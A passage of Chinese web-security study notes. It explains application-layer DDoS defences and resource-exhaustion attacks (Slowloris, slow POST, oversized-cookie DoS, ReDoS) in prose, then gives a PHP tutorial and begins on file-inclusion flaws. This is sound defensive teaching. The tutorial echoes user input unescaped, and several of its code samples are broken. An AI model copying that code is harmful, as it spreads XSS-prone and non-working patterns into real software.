>      合理地使用memcache就是一个很好的优化方案，将数据库的压力尽 可能转移到内存中
> 
>      此外还需要及时地释放资源，比如及时关闭数据库连接，减少空连接等消耗
> 
>  - 在网络架构上做好优化
> 
>      善于利用负载均衡分流，避免用户流量集中在单台服务器上
> 
>      同时可以充分利用好CDN和镜像站点的分流作用，缓解主站的压力
> 
>  - 也是最重要的一点，实现一些对抗手段，比如限制每个IP地址的请求频率

#### <font color="yellow">003 验证码</font>

验证码是互联网中常用的技术之一，它的英文简称是CAPTCHA(Completely Automated Public Turing Test to Tell Computers and Humans Apart，全自动区分计算机和人类的图灵测试)，在很多时候，如果可以忽略对用户体验的影响，那么引入验证码这一手段能够有效地阻止自动化的重放行为，CAPTCHA发明的初衷，是为了识别人与机器，但验证码如果设计得过于复杂，那么人也很难辨识出来，所以验证码是一把双刃剑，有验证码，就会有验证码破解技术，除了直接利用图像相关算法识别验证码外，还可以利用Web实现上可能存在的漏洞破解验证码，因为验证码的验证过程，是比对用户提交的明文和服务器端Session里保存的验证码明文是否一致，所以曾经有验证码系统出现过这样的漏洞，因为验证码消耗掉后SessionID未更新，还有的验证码实现方式，是提前将所有的验证码图片生成好，以哈希过的字符串作为验证码图片的文件名，在使用验证码时，则直接从图片服务器返回已经生成好的验证码，这种设计原本的想法是为了提高性能，但这种一一对应的验证码文件名会存在一个缺陷，攻击者可以事先采用枚举的方式，遍历所有的验证码图片，并建立验证码到明文之间的——对应关系，从而形成一张彩虹表，这也会导致验证码形同虚设，修补的方式是验证码的文件名需要随机化，满足不可预测性原则，随着技术的发展，直接通过算法破解验证码的方法也变得越来越成熟，通过一些图像处理技术，可以将验证码逐步变化成可识别的图片，对此有兴趣的朋友，可以查阅moonblue333所写的如何识别高级的验证码[http://secinn.appspot.com/pstzine/read?issue=2&articleid=9](http://secinn.appspot.com/pstzine/read?issue=2&articleid=9)

#### <font color="yellow">004 防御应用层DDOS</font>

验证码不是万能的，很多时候为了给用户一个最好的体验而不能使用验证码，且验证码不宜使用过于频繁，所以我们还需要有更好的方案，验证码的核心思想是识别人与机器，那么顺着这个思路，在人机识别方面，我们是否还能再做一些事情呢?答案是肯定的，在一般情况下，服务器端应用可以通过判断HTTP头中的User-Agent字段来识别客户端，但从安全性来看这种方法并不可靠，因为HTTP头中的User-Agent是可以被客户端篡改的，所以不能信任，一种比较可靠的方法是让客户端解析一段JavaScript，并给出正确的运行结果，因为大部分的自动化脚本都是直接构造HTTP包完成的，并非在一个浏览器环境中发起的请求，因此一段需要计算的JavaScript，可以判断出客户端到底是不是浏览器，类似的，发送一个flash让客户端解析，也可以起到同样的作用，但需要注意的是，这种方法并不是万能的，有的自动化脚本是内嵌在浏览器中的内挂，就无法检测出来了，除了人机识别外，还可以在Web Server这一层做些防御，其好处是请求尚未到达后端的应用程序里，因此可以起到一个保护的作用，在Apache的配置文件中，有一些参数可以缓解DDOS攻击，比如调小Timeout、KeepAliveTimeout值，增加MaxClients值，但需要注意的是，这些参数的调整可能会影响到正常应用，因此需要视实际情况而定，在Apache的官方文档中对此给出了一些指导——Apache提供的模块接又为我们扩展Apache、设计防御措施提供了可能，目前已经有一些开源的Module全部或部分实现了针对应用层DDOS攻击的保护，mod_qos是Apache的一个Module，它可以帮助缓解应用层DDOS攻击，比如mod_qos的下面这些配置就非常有价值，mod_qos功能强大，它还有更多的配置，有兴趣的朋友可以通过官方网站获得更多的信息[http://httpd.apache.org/docs/trunk/misc/security_tips.html#dos](http://httpd.apache.org/docs/trunk/misc/security_tips.html#dos)，除了mod_qos外，还有专用于对抗应用层DDOS的mod_evasive也有类似的效果[http://opensource.adnovum.ch/mod_pos](http://opensource.adnovum.ch/mod_pos)，mod_qos从思路上仍然是限制单个IP地址的访问频率，因此在面对单个IP地址或者IP地址较少的情况下，比较有用，Yahoo为我们提供了一个解决思路，因为发起应用层DDOS攻击的IP地址都是真实的，所以在实际情况中，攻击者的IP地址其实也不可能无限制增长，假设攻击者有1000个IP地址发起攻击，如果请求了10000次，则平均每个IP地址请求同一页面达到10次，攻击如果持续下去，单个IP地址的请求也将变多，但无论如何变，都是在这1000个IP地址的范围内做轮询，为此Yahoo实现了一套算法，根据IP地址和Cookie等信息，可以计算客户端的请求频率并进行拦截，Yahoo设计的这套系统也是为Web Server开发的一个模块，但在整体架构上会有一台master服务器集中计算所有IP地址的请求频率，并同步策略到每台Webserver上，Yahoo为此申请了一个专利(Detecting system abuse)，因此我们可以查阅此专利的公开信息，以了解更多的详细信息，[http://patft.uspto.gov/netacgi/nph-Parser?Sectl-POT2&Sect2=HITOFF&p=1&u=%2Fnetahtml%2FPTO%2Fsearch-bool.html&r=2&f=G&col=AND&d=PTXT&sl=Yahoo.ASNM.&s2=abuse.TI.&OS=AN/Yahoo+AND+TTL/&RS=AN/Yahoo+AND+TTL/abuse](http://patft.uspto.gov/netacgi/nph-Parser?Sectl-POT2&Sect2=HITOFF&p=1&u=%2Fnetahtml%2FPTO%2Fsearch-bool.html&r=2&f=G&col=AND&d=PTXT&sl=Yahoo.ASNM.&s2=abuse.TI.&OS=AN/Yahoo+AND+TTL/&RS=AN/Yahoo+AND+TTL/abuse)，Yahoo设计的这套防御体系，经过实践检验，可以有效对抗应用层DDOS攻击和一些类似的资源滥用攻击，但Yahoo并未将其开源，因此对于一些研发能力较强的互联网公司来说，可以根据专利中的描述，实现一套类似的系统

#### <font color="yellow">005 资源消耗攻击</font>

除了CC攻击外，攻击者还可能利用一些Web Server的漏洞或设计缺陷，直接造成拒绝服务

##### <font color="yellow">0001 Slowloris攻击</font>

Slowloris是在2009年由著名的Web安全专家RSnake提出的一种攻击方法，其原理是以极低的速度往服务器发送HTTP请求[http://ha.ckers.org/slowloris/](http://ha.ckers.org/slowloris/)，由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被恶意连接占用，从而无法接受新的请求，导致拒绝服务，要保持住这个连接，RSnake构造了一个畸形的HTTP请求，准确地说，是一个不完整的HTTP请求，在正常的HTTP包头中，是以两个CLRF表示HTTP Headers部分结束的，由于Web Server只收到了一个\r\n，因此将认为HTTP Headers部分没有结束，并保持此连接不释放，继续等待完整的请求，此时客户端再发送任意HTTP头，保持住连接即可，<font color="red">此类拒绝服务攻击的本质，实际上是对有限资源的无限制滥用</font>，在Slowloris案例中，有限的资源是连接数，这是一个有上限的值，比如在Apache中这个值由 MaxClients定义，如果恶意客户端可以无限制地将连接数占满，就完成了对有限资源的恶意消耗，导致拒绝服务，在Slowloris发布之前，也曾经有人意识到这个问题，但是Apache官方否认Slowloris的攻击方式是一个漏洞，他们认为这是Web Server的一种特性，通过调整参数能够缓解此类问题，给出的回应是参考文档中调整配置参数的部分，[http://httpd.apache.org/docs/trunk/misc/security_tips.html#dos](http://httpd.apache.org/docs/trunk/misc/security_tips.html#dos)

##### <font color="yellow">0002 HTTP POST DOS</font>

Wong Onn Chee和Tom Brennan演示了一种类似于Slowloris效果的攻击方法，作者称之为HTTP POST D.O.S.[http://www.owasap.org/images/4/43/Layer_7_DDOS.pdf](http://www.owasap.org/images/4/43/Layer_7_DDOS.pdf)，其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以很低的速度发包，比如10~100s发一个字节，保持住这个连接不断开，这样当客户端连接数多了以后，占用住了Web Server的所有可用连接，从而导致DOS，这种攻击的本质也是针对Apache的MaxClients限制的，要解决此类问题，可以使用Web应用防火墙，或者一个定制的Web Server安全模块，凡是资源有限制的地方，都可能发生资源滥用，从而导致拒绝服务，也就是一种资源耗尽攻击，出于可用性和物理条件的限制，内存、进程数、存储空间等资源都不可能无限制地增长，因此如果未对不可信任的资源使用者进行配额的限制，就有可能造成拒绝服务，内存泄漏是程序员经常需要解决的一种bug，而在安全领域中，内存泄漏则被认为是一种能够造成拒绝服务攻击的方式

##### <font color="yellow">0003 Server Limit DOS</font>

Cookie也能造成一种拒绝服务，安全研究者称之为Server Limit DOS,并曾在安全研究者的博客文章中描述过这种攻击[http://hi.baidu.com/aullik5/blog/item/6947261e7eaeaac0a7866913.html](http://hi.baidu.com/aullik5/blog/item/6947261e7eaeaac0a7866913.html)，Web Server对HTTP包头都有长度限制，以Apache举例，默认是8192字节，也就是说，Apache所能接受的最大HTTP包头大小为8192字节(这里指的是Request Header，如果是Request Body，则默认的大小限制是2GB)，如果客户端发送的HTTP包头超过这个大小，服务器就会返回一个4xx错误，假如攻击者通过XSS攻击，恶意地往客户端写入了一个超长的Cookie，则该客户端在清空Cookie之前，将无法再访问该Cookie所在域的任何页面，这是因为Cookie也是放在HTTP包头里发送的，而Web Server默认会认为这是一个超长的非正常请求，从而导致客户端的拒绝服务，要解决此问题，需要调整Apache配置参数LimitRequestFieldSize，这个参数设置为0时，对HTTP包头的大小没有限制，[http://httpd.apache.org/docs/2.0/mod/core.html#limitrequestfieldsize](http://httpd.apache.org/docs/2.0/mod/core.html#limitrequestfieldsize)，拒绝服务攻击的本质实际上就是一种资源耗尽攻击，因此在设计系统时，需要考虑到各种可能出现的场景，避免出现有限资源被恶意滥用的情况，这对安全设计提出了更高的要求

#### <font color="yellow">006 ReDDOS</font>

当正则表达式写得不好时，就有可能被恶意输入利用，消耗大量资源，从而造成DOS，这种攻击被称为ReDOS，ReDOS是一种代码实现上的缺陷，我们知道正则表达式是基于NFA(Nondeterministic Finite Automaton)的，它是—个状态机，每个状态和输入符号都可能有许多不同的下一个状态，正则解析引擎将遍历所有可能的路径直到最后，由于每个状态都有若干个下一个状态，因此决策算法将逐个尝试每个下一个状态，直到找到一个匹配的，当用户恶意构造输入时，这些有缺陷的正则表达式就会消耗大量的系统资源(比如CPU和内存)，从而导致整台服务器的性能下降，表现的结果是系统速度很慢，有的进程或服务失去响应，与拒绝服务的后果是一样的，[http://www.computerbytesman.com/redos/](http://www.computerbytesman.com/redos/)，ReDOS可能会成为一个埋藏在系统中的炸弹，虽然正则表达式的解析算法有可能实现得更好一些，但是流行语言为了提供增强型的解析引擎，仍然使用了naive algorithm，从而使得在很多平台和开发语言内置的正则解析引擎中都存在类似的问题，[http://swtch.com/~rsc/regexp/regexp1.html](http://swtch.com/~rsc/regexp/regexp1.html)，在今天的互联网中，正则表达式可能存在于任何地方，但只要任何一个环节存在有缺陷的正则表达式，就都有可能导致一次ReDOS，在检查应用安全时，一定不能忽略ReDOS可能造成的影响，在本节中提到的几种存在缺陷的正则表达式和测试用例，可以加入安全评估的流程中

#### <font color="yellow">007 总结</font>

在解决应用层拒绝服务攻击时，可以采用验证码，但验证码并不是最好的解决方案，Yahoo的专利为我们提供了更宽广的思路

### <font color="yellow">08 PHP安全</font>

#### <font color="yellow">001 PHP基础</font>

##### <font color="yellow">0001 简介</font>

PHP(超文本预处理器)原始为Personal Home Page的缩写，已经正式更名为PHP: Hypertext Preprocessor，自20世纪90年代国内互联网开始发展到现在，互联网信息几乎覆盖了我们日常活动所有知识范畴，并逐渐成为我们生活、学习、工作中必不可少的一部分，据统计，从2003年开始，我国的网页规模基本保持了翻番的增长速度，并且呈上升趋势，PHP语言作为当今最热门的网站程序开发语言，它具有成本低、速度快、可移植性好、内置丰富的函数库等优点，因此被越来越多的企业应用于网站开发中，但随着互联网的不断更新换代，PHP语言也出现了不少问题，根据动态网站要求，PHP语言作为一种语言程序，其专用性逐渐在应用过程中显现，其技术水平的优劣与否将直接影响网站的运行效率，其特点是具有公开的源代码，在程序设计上与通用型语言，如C语言相似性较高，因此在操作过程中简单易懂，可操作性强，同时，PHP语言具有较高的数据传送处理水平和输出水平，可以广泛应用在Windows系统及各类Web服务器中，如果数据量较大，PHP语言还可以拓宽链接面，与各种数据库相连，缓解数据存储、检索及维护压力，随着技术的发展，PHP语言搜索引擎还可以量体裁衣，实行个性化服务，如根据客户的喜好进行分类收集储存，极大提高了数据运行效率

##### <font color="yellow">0002 主要特点</font>

###### <font color="yellow">a. 开源性和免费性</font>

由于PHP的解释器的源代码是公开的，所以安全系数较高的网站可以自己更改PHP的解释程序，另外，PHP运行环境的使用也是免费的

###### <font color="yellow">b. 快捷性</font>

PHP是一种非常容易学习和使用的一门语言，它的语法特点类似于C语言，但又没有C语言复杂的地址操作，而且又加入了面向对象的概念，再加上它具有简洁的语法规则，使得它操作编辑非常简单，实用性很强

###### <font color="yellow">c. 数据库连接的广泛性</font>

PHP可以与很多主流的数据库建立起连接，如MySQL、ODBC、Oracle等，PHP是利用编译的不同函数与这些数据库建立起连接的，PHPLIB就是常用的为一般事务提供的基库

###### <font color="yellow">d. 面向过程和面向对象并用</font>

在PHP语言的使用中，可以分别使用面向过程和面向对象，而且可以将PHP面向过程和面向对象两者一起混用，这是其它很多编程语言做不到的

###### <font color="yellow">e. 优点</font>

1. 流行，容易上手

    PHP是目前最流行的编程语言，这毋庸置疑，它驱动全球超过2亿多个网站，有全球超过81.7%的公共网站在服务器端采用PHP，PHP常用的数据结构都内置了，使用起来方便简单，也一点都不复杂，表达能力相当灵活

2. 开发职位很多

    在服务器端的网站编程中PHP会更容易帮助你找到工作，很多互联网相关企业都在使用PHP开发框架，所以可以说市场对PHP的开发程序员的需求还是比较大的

3. 仍然在不断发展

    PHP在不断兼容着类似closures和命名空间等技术，同时兼顾性能和当下流行的框架，版本是7之后，一直在提供更高性能的应用

4. 可植入性强

    PHP语言在补丁漏洞升级过程中，核心部分植入简单易行，且速度快

5. 拓展性强

    PHP语言在数据库应用过程中，可以从数据库调取各类数据，执行效率高

###### <font color="yellow">f. 缺点</font>

1. PHP的解释运行机制

	在PHP中，所有的变量都是页面级的，无论是全局变量，还是类的静态成员，都会在页面执行完毕后被清空

2. 设计缺陷

    缺少关注PHP被称作是不透明的语言，因为没有堆栈追踪，各种脆弱的输入，没有一个明确的设计哲学，早期的PHP受到Perl的影响，带有out参数的标准库又是有C语言引入，面向对象的部分又是从C++和Java学来的

3. 对递归的不良支持

    PHP并不擅长递归，它能容忍的递归函数的数量限制和其他语言比起来明显少

##### <font color="yellow">0003 语法</font>

###### <font color="yellow">a. 更全面的语法</font>

[https://www.w3school.com.cn/php/index.asp](https://www.w3school.com.cn/php/index.asp)

###### <font color="yellow">b. PHP代码执行方式</font>

在服务器端执行，然后返回给用户结果，如果直接使用浏览器打开，就会解析为文本，意思是说，需要浏览器通过http请求，才能够执行php页面

###### <font color="yellow">c. 第一段php代码</font>

```php
<?php
    echo "hello world!";
?>
```

上方代码中，注意php语言的格式，第一行和第三行的格式中，没有空格，代码的编写位置在`<?php代码?>`

###### <font color="yellow">d. 注释</font>

```php
// 单行注释
/*
    多行注释
*/
```

###### <font color="yellow">e. 变量</font>

变量以`$`符号开头，其后是变量的名称，<font color="red">大小写敏感</font>

```php
$a1;
$_abc;
```

###### <font color="yellow">f. 数据类型</font>

PHP支持的数据类型包括

- 字符串
- 整数
- 浮点数
- 布尔
- 数组
- 对象
- NULLL

定义字符串时需要注意

- 单引号''：内部的内容只是作为字符串
- 双引号""：如果内部是PHP的变量，那么会将该变量的值解析，如果内部是html代码，也会解析成html

单引号里的内容，一定是字符串，双引号里的内容，可能会进行解析

```php
echo "<input type=`button` value=`smyhvae`>";
```

上面这个语句，就被会解析成按钮

```php
    // 字符串
    $str = '123';

    // 字符串拼接
    $str2 = '123'.'哈哈哈';


    // 整数
    $numA = 1;// 正数
    $numB = -2;// 负数

    // 浮点数
    $x = 1.1;

    // 布尔
    $a = true;
    $b = false;

    // 普通数组：数组中可以放 数字、字符串、布尔值等，不限制类型
    $arr1 = array('123', 123);
    echo $arr1[0];

    // 关系型数组：类似于json格式
    $arr2 = $array(`name`=>`smyhvae`, `age`=>`26`);
    echo $arr2[`name`];// 获取时，通过key来获取
```

上方代码中注意，php中字符串拼接的方式是`.`

###### <font color="yellow">g. 运算符</font>

PHP中的运算符跟JavaScript中的基本一致，用法也基本一致

算数运算符

- +
- -
- /
- *
- %

赋值运算符

- =
- +=
- -=

```php
<?php
    $x = 10;
    $y = 6;

    echo ($x + $y);// 输出16
    echo ($x - $y);// 输出4
    echo ($x * $y);// 输出60
    echo ($x / $y);// 输出1.6666666666667
    echo ($x % $y);// 输出4
?>
```

###### <font color="yellow">h. 函数</font>

```php
function functionName() {
  // 代码
}
```

有参数、无返回值的函数

```php
function sayName($name){
    echo $name.'你好';
}
// 调用
sayName('smyhvae');
```

有参数、参数有默认值的函数

```php
function sayFood($f='你好'){
    echo $f.'好';
}
// 调用
sayFood('你好');// 如果传入参数，就使用传入的参数
sayFood();// 如果不传入参数，直接使用默认值
```

有参数、有返回值的函数

```php
function sum($a,$b){
    return $a+$b
}
sum(1,2);// 返回值为1+2 = 3
```

###### <font color="yellow">i. 类和对象</font>

PHP中允许使用对象这种自定义的数据类型，必须先声明，实例化之后才能够使用

定义最基础的类

```php
class Fox{

    public $name = 'itcast';
    public $age = 10;
}
$fox = new $fox;
// 对象属性取值
$name = $fox->name;
// 对象属性赋值
$fox->name = '小狐狸';
```

带构造函数的类

```php
class fox{
    // 私有属性,外部无法访问
    var $name = '小狐狸';
    // 定义方法 用来获取属性
    function Name(){
    return $this->name;
    }
    // 构造函数,可以传入参数
    function fox($name){
    $this->name = $name
    }
}

// 定义了构造函数 需要使用构造函数初始化对象
$fox = new fox('小狐狸');
// 调用对象方法,获取对象名
$foxName = $fox->Name();
```

###### <font color="yellow">j. 内容输出</font>
        
- echo

    输出字符串

- print_r()

    输出复杂数据类型，比如数组、对象

- var_dump()

    输出详细信息

```php
$arr =array(1,2,'123');

echo'123';
// 结果：123

print_r($arr);
// 结果：Array ([0] => 1 [1] => 2 [2] => 123)
var_dump($arr);
/* 结果：
array
  0 => int 1
  1 => int 2
  2 => string '123' (length=3)
*/
```

###### <font color="yellow">k. 循环语句</font>

这里只列举了foreach、for循环

for循环

```php
for ($x=0; $x<=10; $x++) {
    echo "数字是：$x <br>";
}
```

foreach循环

```php
$colors = array("red","green","blue","yellow");
foreach ($colors as $value) {
    echo "$value <br>";
}
```

上方代码中

参数一：循环的对象

参数二：将对象的值挨个取出，直到最后

如果循环的是对象，输出的是对象的属性的值

###### <font color="yellow">l. php中的`header()`函数</font>

浏览器访问http服务器，接收到响应时，会根据响应报文头的内容进行一些具体的操作，在php中，我们可以根据header来设置这些内容

`header()`函数的作用

- 用来向客户端(浏览器)发送报头
- 直接写在php代码的第一行就行

下面列举几个常见的header函数

1. 设置编码格式

    ```php
    header('content-type:text/html; charset= utf-8');
    ```

    ```php
    <?php
        header('content-type:text/html; charset= utf-8');
        echo "我的第一段 PHP 脚本";
    ?>
    ```

2. 设置页面跳转
    
	```php
    header('location:http://www.baidu.com');
    ```

    设置页面刷新的间隔
    
	```php
    header('refresh:3;url=http://www.xiaomi.com');
    ```

###### <font color="yellow">m. php中的get请求和post请求</font>

get请求

> 可以通过`$_GET`对象来获取，下面是一个简单的表单代码，通过get请求将数据提交到`01.php`
> 
> index.html
> 
> ```html
> <!DOCTYPE html>
> <html lang="en">
>     <head>
>         <meta charset="UTF-8">
>         <title>Title</title>
>     </head>
>     <body>
>         <!--通过get请求，将表单提交到php页面中-->
>         <form action="01.php" method="get">
>             <label for="">姓名：
>                 <input type="text"name="userName"></label>
>             <br/>
>             <label for="">邮箱：
>                 <input type="text"name="userEmail"></label>
>             <br/>
>             <input type="submit"name="">
>         </form>
>     </body>
> </html>
> ```
> 
> 01.php
> 
> ```php
> <?php
>     header('content-type:text/html; charset= utf-8');
>     echo "<h1>php 的get 请求演示</h1>";
>     echo '用户名：'.$_GET['userName'];
>     echo '<br/>';
>     echo '邮箱：'.$_GET['userEmail'];
> ?>
> ```
> 
> 上方代码可以看出，`$_GET`是关系型数组，可以通过`**$_GET[key]**`获取值，这里的key是form标签中表单元素的name属性的值

post请求

> 可以通过`$_POST`对象来获取，下面是一个简单的表单代码，通过post请求将数据提交到`02.php`
> 
> index.html
> 
> ```html
> <!DOCTYPE html>
> <html lang="en">
>     <head>
>         <meta charset="UTF-8">
>         <title>Title</title>
>     </head>
>     <body>
>     <!-- 通过 post 请求，将表单提交到 php 页面中 -->
>         <form action="02.php" method="post" >
>           <label for="">姓名：
>                 <input type="text"name="userName"></label>
>                 <br/>
>           <label for="">邮箱：
>                 <input type="text"name="userEmail"></label>
>                 <br/>
>                 <input type="submit" name="">
>         </form>
>     </body>
> </html>
> ```
> 
> 02.php
> 
> ```php
> <?php
>     header('content-type:text/html; charset= utf-8');
>     echo "<h1>php 的 post 请求演示</h1>";
>     echo '用户名：'.$_POST['userName'];
>     echo '<br/>';
>     echo '邮箱：'.$_POST['userEmail'];
> ?>
> ```
> 
> 上方代码可以看出，`$_POST`是关系型数组，可以通过`**$_POST[key]**`获取值，这里的key是form标签中表单元素的name属性的值，实际开发中，可能不会单独写一个php文件，常见的做法是在html文件中嵌入php的代码
> 
> 比如说，原本html中有个li标签是存放用户名的
> 
> ```html
> <li>smyhvae</li>
> ```
> 
> 嵌入php后，用户名就变成了动态获取的
> 
> ```php
> <li><?php
>     echo $_POST[`userName`]
> ?></li>
> ```

###### <font color="yellow">n. php中文件相关的操作</font>

文件上传`$_FILES`

> 上传文件时，需要在html代码中进行如下设置
> 
> - 在html表单中，设置`enctype="multipart/form-data"`，该值是必须的
> - 只能用post方式获取
> 
> 代码如下
> 
> index.html
> 
> ```html
> <form action="03-fileUpdate.php" method="post" enctype="multipart/form-data">
>     <label for="">照片:
>         <input type="file" name = "picture" multiple=""></label>
>     <br/>
>     <input type="submit" name="">
> </form>
> ```
> 
> 在php文件中打印file的具体内容
> 
> ```php
> <?php
>     sleep(5);// 让服务器休息一会
>     print_r($_FILES);// 打印file的具体内容
> ?>
> ```
> 
> 上方现象可以看出
> 
> 点击提交后，服务器没有立即出现反应，而是休息了一会`sleep(5)`，在`wamp/tmp`目录下面出现了一个`.tmp`文件，`.tmp`文件一会就被自动删除了，服务器返回的内容中有文件的名字`[name] => computer.png`，以及上传文件保存的位置`D:\wamp\tmp\php3D70.tmp`
> 
> 服务器返回的内容如下
> 
> ```php
> Array([upFile] => Array([name] => yangyang.jpg [type] => image/jpeg [tmp_name] => D:\wamp\tmp\phpCC56.tmp [error] => 0 [size] => 18145))
> ```

文件保存

> 我们尝试一下，把上面的例子中的临时目录下面的文件保存起来，这里需要用到php里的`move_uploaded_file()`函数[http://www.w3school.com.cn/php/func_filesystem_move_uploaded_file.asp](http://www.w3school.com.cn/php/func_filesystem_move_uploaded_file.asp)
> 
> 格式如下
> 
> ```php
> move_uploaded_file($_FILES['photo']['tmp_name'], './images/test.jpg');
> ```
> 
> 参数解释
> 
> - 参数一：移动的文件
> - 参数二：目标路径
> 
> index.html(这部分的代码保持不变)
> 
> ```html
> <form action="03.fileUpdate.php" method="post" enctype="multipart/form-data">
>     <label for="">照片:
>         <input type="file" name = "picture" multiple=""></label>
>     <br/>
>     <input type="submit" name="">
> </form>
> ```

WampServer中修改上传文件的大小

> 打开WampServer的文件`php.ini`，修改`php.ini`中的如下内容
>     
> 设置文件最大上传限制(值的大小可以根据需求修改)
> 
> ```php
> file_uploads = On;         是否允许上传文件On/Off默认是On
> upload_max_filesize = 32M; 设置上传文件的最大限制
> post_max_size = 32M;       设置通过Post提交的最多数据
> ```
> 
> 考虑网络传输快慢(这里修改一些参数)
> 
> ```php
> max_execution_time = 30000; 脚本最长的执行时间单位为秒
> max_input_time = 600;       接收提交的数据的时间限制单位为秒
> memory_limit = 1024M;       最大的内存消耗
> ```

##### <font color="yellow">0004 HTTP协议</font>

###### <font color="yellow">a. 请求</font>

客户端发出的请求，主要由三个组成部分

- 请求行
    
	请求方法

    > GET or POST，请求URL

- 请求头
    
	常见的请求头如下
    
	- User-Agent

        浏览器的具体类型

        `User-Agent：Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0`

    - Accept

        浏览器支持哪些数据类型

        `Accept：text/html,application/xhtml+xml,application/xml;q=0.9;`

    - Accept-Charset

        浏览器采用的是哪种编码

        `Accept-Charset：ISO-8859-1`

    - Accept-Encoding

        浏览器支持解码的数据压缩格式

        `Accept-Encoding：gzip, deflate`

    - Accept-Language

        浏览器的语言环境

        `Accept-Language zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3`

    - Host

        请求的主机名，允许多个域名同处一个IP地址，即虚拟主机

        `Host:www.baidu.com`

    - Connection

        表示是否需要持久连接，属性值可以是Keep-Alive/close，HTTP1.1默认是持久连接，它可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间，要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小

        `Connection: Keep-Alive`

    - Content-Length

        表示请求消息正文的长度

        对于POST请求来说Content-Length必须出现

    - Content-Type

        WEB服务器告诉浏览器自己响应的对象的类型和字符集

        `Content-Type: text/html; charset='gb2312'`

    - Content-Encoding

        WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象

        `Content-Encoding：gzip`

    - Content-Language

        WEB服务器告诉浏览器自己响应的对象的语言

    - Cookie：最常用的请求头，浏览器每次都会将cookie发送到服务器上，允许服务器在客户端存储少量数据

    - Referer

        包含一个URL，用户从该URL代表的页面出发访问当前请求的页面

        服务器能知道你是从哪个页面过来的

        `Referer: http://www.baidu.com/`

- 请求主体
 
    指的是提交给服务器的数据，需要注意的是，如果是往服务器提交数据，需要在请求头中设置`Content-Type:application/x-www-form-urlencoded`(在ajax中需要手动设置)

###### <font color="yellow">b. 响应</font>

响应报文是服务器返回给客户端的

组成部分有

- 响应行

    HTTP响应行：主要是设置响应状态等信息

- 响应头

    Cookie、缓存等信息就是在响应头的属性中设置的

    常见的响应头如下

    - Cache-Control

        响应输出到客户端后，服务端通过该报文头属告诉客户端如何控制响应内容的缓存

        下面，的设置让客户端对响应内容缓存3600秒，也即在3600秒内，如果客户再次访问该资源，直接从客户端的缓存中返回内容给客户，不要再从服务端获取(当然，这个功能是靠客户端实现的，服务端只是通过这个属性提示客户端“应该这么做”，做不做，还是决定于客户端，如果是自己宣称支持HTTP的客户端，则就应该这样实现)

        `Cache-Control: max-age=3600`

    - ETag

        一个代表响应服务端资源（如页面）版本的报文头属性，如果某个服务端资源发生变化了，这个ETag就会相应发生变化。它是Cache-Control的有益补充，可以让客户端“更智能”地处理什么时候要从服务端取资源，什么时候可以直接从缓存中返回响应

        `ETag: "737060cd8c284d8af7ad3082f209582d"`

    - Location

        我们在Asp.net中让页面Redirect到一个某个A页面中，其实是让客户端再发一个请求到A页面，这个需要Redirect到的A页面的URL，其实就是通过响应报文头的Location属性告知客户端的，如下的报文头属性，将使客户端redirect到iteye的首页中

        `Location: http://www.google.com.hk`

    - Set-Cookie

        服务端可以设置客户端的Cookie，其原理就是通过这个响应报文头属性实现的

        `Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1`

- 响应主体

    如果请求的是HTML页面，那么返回的就是HTML代码，如果是JS就是JS代码

##### <font color="yellow">0005 抓包工具</font>

常见的抓包工具有

- Fiddler[https://mccxj.github.io/blog/20130531_introduce-to-fiddler.html](https://mccxj.github.io/blog/20130531_introduce-to-fiddler.html)
- Charles[https://blog.devtang.com/2015/11/14/charles-introduction/](https://blog.devtang.com/2015/11/14/charles-introduction/)

#### <font color="yellow">002 文件包含漏洞</font>

PHP是一种非常流行的Web开发语言，在Python、Ruby等语言兴起的今天，PHP仍然是众多开发者所喜爱的选择，在中国尤其如，PHP的语法过于灵活，这也给安全工作带来了一些困，同时PHP也存在很多历史遗留的安全问，在PHP语言诞生之初，互联网安全问题尚不突出，许多今天已知的安全问题在当时并未显现，因此PHP语言设计上一开始并没有过多地考虑安，时至今日，PHP遗留下来的历史安全问题依然不少，但PHP的开发者与整个PHP社区也想做出一些改，严格来说，文件包含漏洞是代码注入的一，注入攻击里曾经提到过代码注入这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务器端执，代码注入的典型代表就是文件包含(File Inclusion，文件包含可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下
- PHP
    
	`include()`
    `include_once()`
    `require()`
    `require_once()`
    `fopen()`
    `readfile()`

- JSP/Servlet

    `ava.io.File()`
    `java.io.FileReader()`

- ASP

    `include file`
    `include virtual`

在互联网的安全历史中，PHP的文件包含漏洞已经臭名昭著了，因为黑客们在各种各样的PHP应用中挖出了数不胜数的文件包含漏洞，且后果都非常严重，文件包含是PHP的一种常见用法，主要由4个函数完成

- `include()`
- `require()`
- `include_once()`
- `require_once()`

当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型，所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行，这一特性，在实施攻击时将非常有用，要想成功利用文件包含漏洞，需要满足下面两个条件

- `include()`等函数通过动态变量的方式引入需要包含的文件
- 用户能够控制该动态变量

##### <font color="yellow">0001 本地文件包含</font>

